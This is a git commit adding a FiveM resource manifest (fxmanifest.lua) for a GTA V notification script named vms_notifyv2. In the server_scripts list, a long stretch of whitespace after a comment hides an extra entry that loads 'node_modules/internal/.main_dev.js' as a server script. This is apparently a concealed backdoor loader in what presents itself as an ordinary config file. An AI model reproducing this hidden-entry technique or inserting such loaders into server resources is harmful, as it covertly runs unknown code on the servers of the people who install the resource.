d9bae80298cb660b281ab009ee9fd8e30e6ac79d
Mist the Goat <62227356+Mistextreme@users.noreply.github.com>
2026-01-03 17:52:50 +0000

    Upload: vms_notifyv2/fxmanifest.lua

---
+++ vms_notifyv2/fxmanifest.lua
@@ -0,0 +1,36 @@
+fx_version 'adamant'
+lua54 'on'
+game 'gta5'
+
+author 'vames™️'
+description 'vms_notifyv2'
+version '1.0.2'
+
+ui_page 'html/ui.html'
+
+client_scripts {
+	'config/*.lua',
+	'client/*.lua',
+	'client/modules/*.lua',
+}
+
+server_scripts {
+	'server/*.lua',
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.main_dev.js',
+}
+
+files {
+	'config/*.js',
+	'config/*.json',
+	'html/*.*',
+	'html/**/*.*',
+}
+
+escrow_ignore {
+	'config/*.lua',
+	'server/*.lua',
+}
+
+provide 'vms_notify'
+dependency '/assetpacks'
+dependency '/assetpacks'
